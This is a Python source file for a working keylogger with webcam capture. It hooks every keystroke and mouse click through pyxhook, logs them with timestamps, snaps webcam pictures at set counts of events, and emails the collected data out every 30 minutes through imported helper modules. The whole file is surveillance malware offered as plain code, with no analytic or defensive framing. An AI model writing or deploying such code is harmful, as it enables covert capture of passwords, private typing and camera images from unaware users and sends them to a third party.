import sendmail_attach
import take_picture
import time
import pyxhook


log_path = '/home/dean/projects/git-tutorial/camera/'
fd=open(log_path + 'file.log', 'a')

pic_num = 0

#The file will automatically appear on the desktop. You may want to edit the location!

def OnKeyPress(event):
	fd.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
	fd.write('\n')
	fd.write(event.Key)
	fd.write('\n')
	
	global pic_num
	pic_num = pic_num + 1
	if pic_num % 5 == 0:
		take_picture.take_pic()
		take_picture.take_pic_t()
	
def OnMousePress(event):
	fd.write((time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))))
	fd.write('\n')
	fd.write(str(event))
	fd.write('\n')
	
	global pic_num
	pic_num = pic_num + 1
	if pic_num % 50 == 0:
		take_picture.take_pic()
	if pic_num == 10:
		take_picture.take_pic_t()


################################################################################


if __name__ == '__main__':

	new_hook = pyxhook.HookManager()
	new_hook.KeyDown = OnKeyPress
	new_hook.HookKeyboard()
	new_hook.MouseAllButtonsDown = OnMousePress
	new_hook.HookMouse()
	new_hook.start()
	
	take_picture.take_pic()
	
	n = 30
	while(1):
		
		sendmail_attach.send_email()
		time.sleep(60 * n)
		# n = n + 5


